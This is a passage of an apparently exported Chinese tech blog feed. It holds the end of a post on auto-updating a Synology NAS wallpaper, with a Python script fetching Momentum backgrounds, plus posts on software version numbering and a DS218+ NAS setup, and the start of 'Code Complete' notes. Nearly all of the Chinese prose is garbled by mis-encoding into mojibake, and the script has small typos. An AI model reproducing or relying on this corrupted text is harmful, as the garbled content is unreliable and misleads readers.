ä¿®æ”¹æ–‡ä»¶æ–¹å¼éƒ½æ˜¯æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å–å‡ºæ¥ï¼Œç„¶åå†æŠŠä¿®æ”¹åçš„æ–‡ä»¶èµ‹å€¼ç»™å˜é‡ï¼Œæœ€åå†è¦†å†™åŸæ¥çš„æ–‡ä»¶ï¼Œè¿™ç§æ–¹å¼ä¸å¤ªä¼˜é›…ï¼Œæˆ‘ä¿®æ”¹ä¸€ä¸ªå­—ç¬¦éƒ½è¦è¯»å–å…¨éƒ¨çš„æ–‡ä»¶å¹¶å›å†™ï¼Œå› æ­¤é€‰æ‹©ä½¿ç”¨äº† sed æ¥æ“ä½œã€‚sed ç›¸åŒçš„å‘½ä»¤åœ¨ Mac ä¸‹æ‰§è¡Œå°±ä¼šæŠ¥ <code>sed: 1: &quot;synoinfo.conf&quot;: unterminated substitute pattern</code> çš„é”™è¯¯ï¼Œä½† Linux ä¸‹å°±å®Œå…¨æ­£å¸¸ï¼ŒUnix å’Œ Linux ç³»ç»Ÿé—´è¿˜æ˜¯è¦æ³¨æ„è¿™äº›å¾®å°çš„å·®åˆ«ï¼Œå®³å¾—æˆ‘è°ƒäº†åŠå¤©ã€‚</p></blockquote><p>æŠŠä»¥ä¸Šä»£ç ä¿å­˜ä¸ºæ–‡ä»¶ï¼Œç”±äºèƒŒæ™¯å›¾æ–‡ä»¶æ˜¯ root ç”¨æˆ·ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ root ç”¨æˆ·æ‰§è¡Œ<code>php .../bing_wallpaper.php</code>ï¼Œå¦‚æœå‘ç°åœ¨ç›®æ ‡ä½ç½®äº§ç”Ÿäº†æœ€æ–°çš„èƒŒæ™¯å›¾æ–‡ä»¶ï¼Œå¹¶åœ¨ä¸»é¢˜è®¾ç½®é¡µç”Ÿæ•ˆï¼Œåˆ™è¯´æ˜ä»£ç å·¥ä½œæ­£å¸¸ã€‚<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8ibjcc27vj30mv0ewq66.jpg" alt=""></p><p>æ¥ä¸‹æ¥å°±æ˜¯åˆ›å»ºè®¡åˆ’ä»»åŠ¡äº†ï¼Œç¦»æˆåŠŸåªæœ‰ä¸€æ­¥äº†<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8iaflytkuj30km0fjta6.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8iai54gl0j30ep06274e.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8iaikc1syj30en0epgm6.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8iaj7rwt4j30eq09cdgg.jpg" alt=""></p><p>è‡³æ­¤ï¼Œå¤§åŠŸå‘Šæˆï¼Œæ¥çœ‹ä¸‹æ•ˆæœå›¾ã€‚emmmm, not bad.<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8ias6kh5dj30vc0mcu0n.jpg" alt=""></p><p>æœ€åï¼Œå¦‚æœä½ è§‰å¾—å·¦ä¸Šè§’çš„ä¿¡æ¯æœ‰äº›æ— è¶£ï¼Œä¹Ÿå¯ä»¥ç”¨<a href="https://github.com/chinese-poetry/chinese-poetry" target="_blank" rel="noopener">chinese-poetry</a>æ¯å¤©è‡ªåŠ¨æ›´æ¢å¤è¯—è¯ï¼Œæˆ–è€…æŠ“å– <a href="http://wufazhuce.com/one/2618" target="_blank" rel="noopener">OneÂ·ä¸€ä¸ª</a>çš„æ¯æ—¥ä¸€å¥æ›¿æ¢ï¼Œè¿˜å¯ä»¥æŠ“åŒ…åˆ†æè±†ç“£çš„ iOS æ¯æ—¥ç”µå½± widgetï¼Œè·å–ç”µå½±å°è¯â€¦â€¦æ›´å¤šç©æ³•ç­‰å¾…è§£é”ã€‚</p><h2 id="â€”-2019-11-10-æ›´-â€”"><a href="#â€”-2019-11-10-æ›´-â€”" class="headerlink" title="â€” 2019.11.10 æ›´ â€”"></a><center>â€” 2019.11.10 æ›´ â€”</center></h2><p>Chrome é¦–é¡µæ’ä»¶ Momentum çš„å›¾ç‰‡ä¼šä»¥ GET è¯·æ±‚<code>https://api.momentumdash.com/feed/bulk?syncTypes=backgrounds&amp;localDate=2019-11-10</code>ï¼Œ<code>header</code>ä¸­å¿…é¡»æºå¸¦<code>authorization</code>å‚æ•°ï¼Œå…¶å®ƒå‚æ•°å‡ä¸ºå¯é€‰ã€‚URL ä¸­çš„<code>localDate</code>ä¸ºå¿…å¡«ï¼Œä½†æ²¡æœ‰å®é™…æ„ä¹‰ï¼Œæ—¥æœŸç»“æœç”±<code>x-momentum-clientdate</code>æ§åˆ¶ï¼Œæœªè®¾å®š<code>x-momentum-clientdate</code>åˆ™è¡¨ç¤ºä¸ºå½“æ—¥æ—¥æœŸã€‚</p><p>è·å–<code>authorization</code>å¯åœ¨é¡µé¢ç½‘ç»œä¸­æŸ¥çœ‹ï¼Œä»¥ä¸‹æ˜¯ Insomnia çš„è¯·æ±‚åŠè¿”å›<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8t24flp6qj31jb0u0k1r.jpg" alt=""></p><p>æ„Ÿè°¢@<a href="http://www.fridayhaohao.com/" target="_blank" rel="noopener">æˆ‘çš„ç²¾ç¥å®¶å›­</a> æä¾›çš„ Python è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlretrieve</span><br><span class="line"></span><br><span class="line">client_id = <span class="string">''</span>  <span class="comment"># æ›¿æ¢æˆè‡ªå·±çš„</span></span><br><span class="line">directory = <span class="string">'/friday'</span></span><br><span class="line">filename = directory + <span class="string">'/bg.jpg'</span></span><br><span class="line">bg_blur = directory + <span class="string">'/bg_blur.jpg'</span></span><br><span class="line">today = time.strftime(<span class="string">"%Y-%m-%d"</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'authorization'</span>: <span class="string">'Bearer eyJ0eXA...'</span>,  <span class="comment"># æ›¿æ¢</span></span><br><span class="line">    <span class="string">'Host'</span>: <span class="string">'api.momentumdash.com'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'*/*'</span>,</span><br><span class="line">    <span class="string">'X-Momentum-ClientId'</span>: client_id,</span><br><span class="line">    <span class="string">'x-momentum-clientdate'</span>: <span class="string">'2018-03-16'</span>,</span><br><span class="line">    <span class="string">'X-Momentum-Version'</span>: <span class="string">'0.100.1'</span>,</span><br><span class="line">    <span class="string">'x-momentum-settings-etag'</span>: <span class="string">'0400bf20-0000-0000-0000-5aaf255a0000'</span>,</span><br><span class="line">    <span class="string">'X-Momentum-ClientDate'</span>: today,</span><br><span class="line">    <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, li ke Gecko) Chrome/57.0.2987.133 Safari/537.36'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>,</span><br><span class="line">    <span class="string">'cookie'</span>: <span class="string">''</span>  <span class="comment"># æ›¿æ¢</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'https://api.momentumdash.com/feed/bulk?syncTypes=backgrounds&amp;localDate='</span> + today, headers=headers)</span><br><span class="line"><span class="comment"># print(r.content)</span></span><br><span class="line"><span class="comment"># print(r.text()print(r.json())</span></span><br><span class="line">image_list = r.json()[<span class="string">'backgrounds'</span>]</span><br><span class="line">image_url = <span class="string">''</span></span><br><span class="line">print(image_list)</span><br><span class="line"><span class="keyword">for</span> image <span class="keyword">in</span> image_list:</span><br><span class="line">    <span class="keyword">if</span> image[<span class="string">'forDate'</span>] == today:</span><br><span class="line">        image_url = image[<span class="string">'filename'</span>]</span><br><span class="line">print(image_url)</span><br><span class="line"><span class="keyword">if</span> image_url:</span><br><span class="line">    urlretrieve(image_url, filename)</span><br><span class="line">img = Image.open(filename)</span><br><span class="line">new_img = img.resize((<span class="number">1536</span>, <span class="number">1023</span>), Image.ANTIALIAS)</span><br><span class="line">new_img.save(filename, quility=<span class="number">100</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è½¯ä»¶ç‰ˆæœ¬å·è§„èŒƒåŠå‘½å</title>
      <link href="/post/software-version-rule/"/>
      <url>/post/software-version-rule/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8e1gpfct1j31hc0u0jtr.jpg" alt=""></p><p><code>package.json</code>ä¸­çš„ç‰ˆæœ¬å·éƒ½æ˜¯ä»€ä¹ˆå«ä¹‰å‘¢ï¼Ÿ</p><a id="more"></a><h2 id="ç‰ˆæœ¬å·æ ¼å¼"><a href="#ç‰ˆæœ¬å·æ ¼å¼" class="headerlink" title="ç‰ˆæœ¬å·æ ¼å¼"></a>ç‰ˆæœ¬å·æ ¼å¼</h2><p>æˆ‘ä»¬é€šå¸¸ä½¿ç”¨çš„æ˜¯<code>X.Y.Z</code>æ ¼å¼çš„ç‰ˆæœ¬å·ï¼Œå®ƒä»¬åˆ†åˆ«è¡¨ç¤ºä¸»ã€æ¬¡ã€ä¿®æ­£ç‰ˆæœ¬å·ã€‚</p><h2 id="ç‰ˆæœ¬å·çš„æ¼”è¿›"><a href="#ç‰ˆæœ¬å·çš„æ¼”è¿›" class="headerlink" title="ç‰ˆæœ¬å·çš„æ¼”è¿›"></a>ç‰ˆæœ¬å·çš„æ¼”è¿›</h2><table><thead><tr><th align="center">ç‰ˆæœ¬å·</th><th align="left">å«ä¹‰</th></tr></thead><tbody><tr><td align="center">0.1.0</td><td align="left">å¼€å‘ç‰ˆç¬¬ä¸€æ¬¡å‘å¸ƒ</td></tr><tr><td align="center">0.1.1</td><td align="left">ç¬¬ä¸€æ¬¡å‘å¸ƒä¿®æ­£ç‰ˆ</td></tr><tr><td align="center">0.2.0</td><td align="left">å¼€å‘ç‰ˆé‡å¤§æ›´æ–°</td></tr><tr><td align="center">1.0.0</td><td align="left">ç¨³å®šç‰ˆç¬¬ä¸€æ¬¡å‘å¸ƒ</td></tr><tr><td align="center">1.0.1</td><td align="left">ç¬¬ä¸€æ¬¡ç¨³å®šç‰ˆä¿®æ­£</td></tr><tr><td align="center">1.0.2</td><td align="left">ç¬¬äºŒæ¬¡ç¨³å®šç‰ˆä¿®æ­£</td></tr><tr><td align="center">1.1.0</td><td align="left">ç¨³å®šç‰ˆæ–°åŠŸèƒ½æ¨å‡º</td></tr><tr><td align="center">2.0.0</td><td align="left">ç¨³å®šç‰ˆé‡å¤§æ›´æ–°</td></tr></tbody></table><h2 id="ç‰ˆæœ¬ç¬¦å·è¯´æ˜"><a href="#ç‰ˆæœ¬ç¬¦å·è¯´æ˜" class="headerlink" title="ç‰ˆæœ¬ç¬¦å·è¯´æ˜"></a>ç‰ˆæœ¬ç¬¦å·è¯´æ˜</h2><table><thead><tr><th>ç‰ˆæœ¬å·ç¬¦å·</th><th>ç¤ºä¾‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>ç²¾ç¡®åŒ¹é…</td><td><code>1.2.3</code></td><td><code>1.2.3</code></td></tr><tr><td>æ˜Ÿå·</td><td><code>1.0.*</code></td><td><code>&gt;=1.0</code>ä¸”<code>&lt;1.1</code></td></tr><tr><td>è¿å­—ç¬¦</td><td><code>1.0-2.0</code></td><td><code>&gt;=1.0.0</code>ä¸”<code>&lt;2.1</code></td></tr><tr><td>æ³¢æµªçº¿</td><td><code>~1.2</code></td><td><code>&gt;=1.2</code>ä¸”<code>&lt;2.0</code></td></tr><tr><td>è„±å­—ç¬¦</td><td><code>^1.2.3</code><br><code>^0.3</code></td><td><code>&gt;=1.2.3</code>ä¸”<code>&lt;2.0</code><br><code>&gt;=0.3.0</code>ä¸”<code>&lt;0.4.0</code></td></tr><tr><td>ç‰ˆæœ¬æ ‡è¯†</td><td><code>@stable</code><br><code>@dev</code></td><td><code>dev &gt; alpha &gt; beta &gt; RC &gt; stable</code><br>é¢„è®¾æŠ“å–stableï¼Œä½†å¯ç”¨@æŒ‡å®š</td></tr></tbody></table><h2 id="Alphaã€Betaã€RCã€GA-ç‰ˆæœ¬çš„åŒºåˆ«"><a href="#Alphaã€Betaã€RCã€GA-ç‰ˆæœ¬çš„åŒºåˆ«" class="headerlink" title="Alphaã€Betaã€RCã€GA ç‰ˆæœ¬çš„åŒºåˆ«"></a>Alphaã€Betaã€RCã€GA ç‰ˆæœ¬çš„åŒºåˆ«</h2><p>Alphaï¼šæ˜¯å†…éƒ¨æµ‹è¯•ç‰ˆï¼Œä¸€èˆ¬ä¸å‘å¤–éƒ¨å‘å¸ƒï¼Œä¼šæœ‰å¾ˆå¤šBugã€‚ä¸€èˆ¬åªæœ‰æµ‹è¯•äººå‘˜ä½¿ç”¨ã€‚</p><p>Betaï¼šä¹Ÿæ˜¯æµ‹è¯•ç‰ˆï¼Œè¿™ä¸ªé˜¶æ®µçš„ç‰ˆæœ¬ä¼šä¸€ç›´åŠ å…¥æ–°çš„åŠŸèƒ½ã€‚åœ¨Alphaç‰ˆä¹‹åæ¨å‡ºã€‚</p><p>RCï¼š(Releaseã€€Candidate) é¡¾åæ€ä¹‰ä¹ˆ ! ç”¨åœ¨è½¯ä»¶ä¸Šå°±æ˜¯å€™é€‰ç‰ˆæœ¬ã€‚ç³»ç»Ÿå¹³å°ä¸Šå°±æ˜¯å‘è¡Œå€™é€‰ç‰ˆæœ¬ã€‚RC ç‰ˆä¸ä¼šå†åŠ å…¥æ–°çš„åŠŸèƒ½äº†ï¼Œä¸»è¦ç€é‡äºé™¤é”™ã€‚</p><p>GA:General Availabilityï¼Œæ­£å¼å‘å¸ƒçš„ç‰ˆæœ¬ï¼Œåœ¨å›½å¤–éƒ½æ˜¯ç”¨ GA æ¥è¯´æ˜releaseç‰ˆæœ¬çš„ã€‚</p><p>RTMï¼š(Release to Manufacture)æ˜¯ç»™å·¥å‚å¤§é‡å‹ç‰‡çš„ç‰ˆæœ¬ï¼Œå†…å®¹è·Ÿæ­£å¼ç‰ˆæ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡ RTM ç‰ˆä¹Ÿæœ‰å‡ºé™åˆ¶ã€è¯„ä¼°ç‰ˆçš„ã€‚ä½†æ˜¯å’Œæ­£å¼ç‰ˆæœ¬çš„ä¸»è¦ç¨‹åºä»£ç éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p><p>OEMï¼šæ˜¯ç»™è®¡ç®—æœºå‚å•†éšç€è®¡ç®—æœºè´©å–çš„ï¼Œä¹Ÿå°±æ˜¯éšæœºç‰ˆã€‚åªèƒ½éšæœºå™¨å‡ºè´§ï¼Œä¸èƒ½é›¶å”®ã€‚åªèƒ½å…¨æ–°å®‰è£…ï¼Œä¸èƒ½ä»æ—§æœ‰æ“ä½œç³»ç»Ÿå‡çº§ã€‚åŒ…è£…ä¸åƒé›¶å”®ç‰ˆç²¾ç¾ï¼Œé€šå¸¸åªæœ‰ä¸€é¢CDå’Œè¯´æ˜ä¹¦(æˆæƒä¹¦)ã€‚</p><p>RVLï¼šå·ç§°æ˜¯æ­£å¼ç‰ˆï¼Œå…¶å®RVLæ ¹æœ¬ä¸æ˜¯ç‰ˆæœ¬çš„åç§°ã€‚å®ƒæ˜¯ä¸­æ–‡ç‰ˆ/è‹±æ–‡ç‰ˆæ–‡æ¡£ç ´è§£å‡ºæ¥çš„ã€‚</p><p>EVALï¼šè€Œæµé€šåœ¨ç½‘ç»œä¸Šçš„EVALç‰ˆï¼Œä¸â€œè¯„ä¼°ç‰ˆâ€ç±»ä¼¼ï¼ŒåŠŸèƒ½ä¸Šå’Œé›¶å”®ç‰ˆæ²¡æœ‰åŒºåˆ«ã€‚</p><p>RTLï¼šRetail(é›¶å”®ç‰ˆ)æ˜¯çœŸæ­£çš„æ­£å¼ç‰ˆï¼Œæ­£å¼ä¸Šæ¶é›¶å”®ç‰ˆã€‚åœ¨å®‰è£…ç›˜çš„i386æ–‡ä»¶å¤¹é‡Œæœ‰ä¸€ä¸ªeula.txtï¼Œæœ€åæœ‰ä¸€è¡ŒEULAIDï¼Œå°±æ˜¯ä½ çš„ç‰ˆæœ¬ã€‚æ¯”å¦‚ç®€ä½“ä¸­æ–‡æ­£å¼ç‰ˆæ˜¯EULAID:WX.4_PRO_RTL_CNï¼Œç¹ä½“ä¸­æ–‡æ­£å¼ç‰ˆæ˜¯WX.4_PRO_RTL_TWã€‚å…¶ä¸­ï¼šå¦‚æœæ˜¯WX.å¼€å¤´æ˜¯æ­£å¼ç‰ˆï¼ŒWB.å¼€å¤´æ˜¯æµ‹è¯•ç‰ˆã€‚_PREï¼Œä»£è¡¨å®¶åº­ç‰ˆï¼›_PROï¼Œä»£è¡¨ä¸“ä¸šç‰ˆã€‚</p><p>Î±ã€Î²ã€Î»å¸¸ç”¨æ¥è¡¨ç¤ºè½¯ä»¶æµ‹è¯•è¿‡ç¨‹ä¸­çš„ä¸‰ä¸ªé˜¶æ®µï¼ŒÎ±æ˜¯ç¬¬ä¸€é˜¶æ®µï¼Œä¸€èˆ¬åªä¾›å†…éƒ¨æµ‹è¯•ä½¿ç”¨ï¼›Î²æ˜¯ç¬¬äºŒä¸ªé˜¶æ®µï¼Œå·²ç»æ¶ˆé™¤äº†è½¯ä»¶ä¸­å¤§éƒ¨åˆ†çš„ä¸å®Œå–„ä¹‹å¤„ï¼Œä½†ä»æœ‰å¯èƒ½è¿˜å­˜åœ¨ç¼ºé™·å’Œæ¼æ´ï¼Œä¸€èˆ¬åªæä¾›ç»™ç‰¹å®šçš„ç”¨æˆ·ç¾¤æ¥æµ‹è¯•ä½¿ç”¨ï¼›Î»æ˜¯ç¬¬ä¸‰ä¸ªé˜¶æ®µï¼Œæ­¤æ—¶äº§å“å·²ç»ç›¸å½“æˆç†Ÿï¼Œåªéœ€åœ¨ä¸ªåˆ«åœ°æ–¹å†åšè¿›ä¸€æ­¥çš„ä¼˜åŒ–å¤„ç†å³å¯ä¸Šå¸‚å‘è¡Œã€‚</p><hr><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ol><li><a href="http://semver.org/lang/zh-CN/" target="_blank" rel="noopener">è¯­ä¹‰åŒ–ç‰ˆæœ¬ 2.0.0</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç‰ˆæœ¬å· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¾¤æ™–NAS ç§æœ‰äº‘æ­å»ºè®°</title>
      <link href="/post/nas/"/>
      <url>/post/nas/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8ckrzioopj31400u0x6p.jpg" alt=""></p><p>å†ä¹Ÿä¸ç”¨æ‹…å¿ƒç½‘ç›˜å€’é—­é™é€Ÿäº†ğŸ˜</p><a id="more"></a><p>ä¹‹å‰å®¶é‡Œçš„è·¯ç”±å™¨è™½ç„¶æœ‰æ–‡ä»¶å…±äº«åŠç®¡ç†åŠŸèƒ½ï¼Œä½†æŒ‚è½½ç£ç›˜æ˜¯ NTFS çš„ï¼ŒMac å¾ˆéš¾ç®¡ç†è¿™ç§æ ¼å¼ï¼Œåˆ›å»ºä¿®æ”¹æ–‡ä»¶å¤¹ä»€ä¹ˆçš„ä¹Ÿéå¸¸ä¸æ–¹ä¾¿ï¼Œåœ¨ 10.24 æ™šç»ˆäºæ„Ÿè§‰éš¾ä»¥å¿å—ï¼Œçœ‹åˆ°äº¬ä¸œç¾¤æ™– DS218+ æ­£å¥½æ˜¯æœ€ä½ä»·ï¼Œçº ç»“åŠå¤©åè¿˜æ˜¯å‰æ‰‹äº†ã€‚äº¬ä¸œå¿«é€’å¾ˆå¿«ï¼Œæ™šä¸Šä¸‹å•ï¼Œç¬¬äºŒå¤©æ—©ä¸Šå°±æ”¶åˆ°è´§äº†ã€‚å‘¨äº”æ™šä¸Šä¸‹ç­åå°±è¿«ä¸åŠå¾…å›å®¶å¼€å§‹æŠ˜è…¾ã€‚</p><p>DS218+ æœ‰ä¸¤ä¸ªç›˜ä½ï¼Œæœ€å¤§æ”¯æŒ 20TBï¼Œå†…ç½® 2G å†…å­˜ï¼Œä½†å¯ä»¥æ‰©å±•åˆ° 6GBï¼Œæ”¯æŒ 4K è§£ç ã€‚ä½†ç¡¬ç›˜æ˜¯éœ€è¦å•ç‹¬è´­ä¹°çš„ï¼Œæˆ‘ä¹‹å‰æ­£å¥½åœ¨ç¾äºšæµ·æ·˜äº†ä¸€ä¸ª 10TB çš„è¥¿æ•°ç¡¬ç›˜ï¼ŒæŸ¥è¯¢äº†ä¸€äº›èµ„æ–™åï¼Œå‘ç°å¯ä»¥å°†è¯¥ç¡¬ç›˜ç›’æ‹†æ‰å–å‡ºç¡¬ç›˜ï¼Œè¿™æ­£æ˜¯æˆ‘æƒ³è¦çš„ã€‚äºæ˜¯æˆ‘è¦æŠŠæ‹†è§£åçš„ç¡¬ç›˜æ’å…¥ç¾¤æ™–ã€‚</p><p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8cksf1t0hj31400u0e82.jpg" alt=""></p><p>åœ¨ B ç«™çœ‹äº†ä¸ªæ‹†è§£æ•™ç¨‹åï¼Œå¤§æ¦‚äº†è§£ä¸€ç‚¹å†…éƒ¨ç»“æ„ï¼Œäºæ˜¯ç…§çŒ«ç”»è™ï¼Œç”¨é“¶è¡Œå¡æ‹†äº†ä¸€ä¼šå„¿å°±æ‰“å¼€äº†ã€‚æ‹†å®Œåå‘ç°æœ‰ä¸€ä¸ªå¡æ‰£è¿˜æ˜¯æŠ˜äº†ğŸ˜…</p><p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8cktlhsomj31400u0x6p.jpg" alt=""></p><p>äºæ˜¯æ’å…¥ç¾¤æ™–å‡†å¤‡å¼€å§‹ä½“éªŒä¸€ä¸‹ï¼Œå®‰è£…ç³»ç»Ÿæç¤ºæˆ‘è¦æ ¼å¼åŒ–ï¼Ÿä½†æ˜¯ç¡¬ç›˜å·²ç»å­˜å‚¨äº† 2T çš„èµ„æºï¼Œå¾ˆå¤šéƒ½æ˜¯ 4K çš„ï¼Œæˆ‘æ‰‹é‡Œè¿˜æœ‰å— 1T çš„ç¡¬ç›˜ï¼Œä½†å¾ˆå¤šèµ„æºä¹Ÿå¾—ä¸¢æ‰äº†ï¼Œä¸€éƒ¨å‰§ 500+Gï¼Œå®åœ¨æ˜¯æ”¾ä¸ä¸‹ï¼Œæ‹·è´è¿˜è¦èŠ±å¾ˆé•¿æ—¶é—´ã€‚å³ä¾¿ä¸¢å¼ƒäº†å¾ˆå¤šèµ„æºï¼Œæœ€åæ‹·è´å®Œä¹Ÿåˆ°äº†å‡Œæ™¨ 1 ç‚¹åŠï¼Œæœ€åç»ˆäºåœ¨ 2 ç‚¹é’ŸæˆåŠŸå®Œæˆå®‰è£…ã€‚</p><p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8cl8q958kj30u01404qq.jpg" alt=""></p><p>ç¾¤æ™–çš„åŠŸèƒ½è¿˜æ˜¯éå¸¸ä¸°å¯Œçš„ï¼Œåº”ç”¨ä¸­å¿ƒåŒ…æ‹¬ dockerã€PHPã€Pythonã€Tomcatã€Apacheã€Javaã€MariaDBã€WordPressã€ä¸‹è½½å·¥å…·ã€è§†é¢‘æ’­æ”¾å™¨ã€éŸ³é¢‘æ’­æ”¾å™¨ã€ç…§ç‰‡ç®¡ç†ã€æ–‡æ¡£ç¼–è¾‘â€¦â€¦ä¸ä»…å¯ä»¥ä½œä¸ºä¸€å°å°å‹æœåŠ¡å™¨ï¼Œè¿˜å¯ä»¥éšæ—¶éšåœ°æŸ¥çœ‹ç¡¬ç›˜å‚¨å­˜çš„èµ„æ–™ï¼Œä¹Ÿå¯ä»¥å°†æ‰‹æœºæˆ–è€…ç”µè„‘çš„èµ„æ–™éšæ—¶éšåœ°ä¿å­˜åˆ° NAS ä¸­ã€‚ç”±äºä¹‹å‰çš„è·¯ç”±å™¨å·²ç»åšäº† DDNSï¼Œæ‰€ä»¥ NAS æˆ‘åªéœ€è¦åœ¨åŸæ¥çš„åŸŸåä¸ŠåŠ ä¸Šå¯¹åº”çš„ç«¯å£å·å°±å¯ä»¥åœ¨å¤–ç½‘è®¿é—®äº†ï¼Œéå¸¸çš„æ–¹ä¾¿ã€‚</p><p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8clehlcuyj31400u0atx.jpg" alt=""></p><p>ç”±äºæˆ‘åªæœ‰ä¸€å—ç¡¬ç›˜ï¼Œæ‰€ä»¥å¦‚æœç¡¬ç›˜æŒ‚äº†çš„è¯ï¼Œè¿™å—ç¡¬ç›˜ä¸Šçš„æ‰€æœ‰æ•°æ®å°±éƒ½ä¸¢å¤±äº†ï¼Œä½†ç¾¤æ™–å¯ä»¥ç”¨å¤šå—ç¡¬ç›˜ç»„æˆ RAIDï¼Œé€šè¿‡å†—ä½™çš„æ–¹å¼æ¥ä¿éšœæ•°æ®çš„å®‰å…¨æ€§ï¼Œè€ƒè™‘åˆ°ç°åœ¨çš„ç¡¬ç›˜ç©ºé—´å·²ç»è¶³å¤Ÿï¼Œè¿˜æ˜¯ä»¥åå†è¯´å¦ä¸€å—ç¡¬ç›˜çš„äº‹å§ã€‚</p><p>å¯¹äºå®¶é‡Œçš„å°ç±³ç”µè§†æ¥è¯´ï¼Œä¹‹å‰ä»è·¯ç”±å™¨è¯»å– 4K è§†é¢‘æ€»æ˜¯ä¼šä¸æ—¶å¡é¡¿ï¼Œç°åœ¨å®Œå…¨å°±åƒæœ¬åœ°è¯»å–ä¸€æ ·ï¼Œéå¸¸æµç•…ã€‚</p><p>btkitty ä¹ŸæŒ‚äº†ï¼Œé‚£äº›å®è´µçš„èµ„æºå¯èƒ½å†ä¹Ÿæ‰¾ä¸å›æ¥äº†ï¼Œå¿ƒç—›ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šä»£ç å¤§å…¨ã€‹</title>
      <link href="/post/code-completed/"/>
      <url>/post/code-completed/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87bbp4fgij30uk0fa0vg.jpg" alt=""></p><blockquote><p>å¤§é“è‡³ç®€ï¼Œå°‘å³æ˜¯å¤šã€‚</p></blockquote><a id="more"></a><h2 id="ç¬¬1ç« -æ¬¢è¿è¿›å…¥è½¯ä»¶æ„å»ºçš„ä¸–ç•Œ"><a href="#ç¬¬1ç« -æ¬¢è¿è¿›å…¥è½¯ä»¶æ„å»ºçš„ä¸–ç•Œ" class="headerlink" title="ç¬¬1ç«  æ¬¢è¿è¿›å…¥è½¯ä»¶æ„å»ºçš„ä¸–ç•Œ"></a>ç¬¬1ç«  æ¬¢è¿è¿›å…¥è½¯ä»¶æ„å»ºçš„ä¸–ç•Œ</h2><p>ï¼ˆç•¥ï¼‰</p><h2 id="ç¬¬2ç« -ç”¨éšå–»æ¥æ›´å……åˆ†åœ°ç†è§£è½¯ä»¶å¼€å‘"><a href="#ç¬¬2ç« -ç”¨éšå–»æ¥æ›´å……åˆ†åœ°ç†è§£è½¯ä»¶å¼€å‘" class="headerlink" title="ç¬¬2ç«  ç”¨éšå–»æ¥æ›´å……åˆ†åœ°ç†è§£è½¯ä»¶å¼€å‘"></a>ç¬¬2ç«  ç”¨éšå–»æ¥æ›´å……åˆ†åœ°ç†è§£è½¯ä»¶å¼€å‘</h2><p>ç²¾å¿ƒè®¡åˆ’ï¼Œå¹¶ä¸æ„å‘³ç€äº‹æ— å·¨ç»†çš„è®¡åˆ’æˆ–è€…è¿‡çš„è®¡åˆ’ã€‚ä½ 